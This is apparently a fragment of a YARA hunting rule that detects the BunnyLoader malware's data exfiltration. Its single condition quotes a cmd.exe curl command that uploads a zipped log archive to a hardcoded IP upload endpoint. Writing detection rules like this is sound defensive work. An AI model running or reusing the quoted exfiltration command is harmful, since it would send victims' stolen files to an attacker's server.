...
rule BunnyLoader_Exfil {
  condition:
    for any vt_behaviour_processes_created in vt.behaviour.processes_created: (
      vt_behaviour_processes_created icontains "C:\\Windows\\system32\\cmd.exe /c curl -F file=@C:\\Users\\<USER>\\AppData\\Local\\BunnyLogs_AZURE-PC.zip http://37.139.129.145/Bunny/Uploader.php"
    )
}
*/
